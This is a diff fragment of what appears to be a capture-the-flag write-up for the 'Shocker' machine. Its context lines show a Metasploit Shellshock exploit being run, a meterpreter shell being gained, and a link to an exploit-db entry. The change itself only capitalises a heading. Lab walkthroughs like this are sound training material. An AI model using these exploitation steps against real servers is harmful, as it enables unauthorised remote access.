@@ -141,7 +141,7 @@ msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
 meterpreter > getuid 
 Server username: no-user @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000)
 ```
-## exploit-db
+## Exploit-db
 Exploitation: https://www.exploit-db.com/exploits/34900
 
 ```
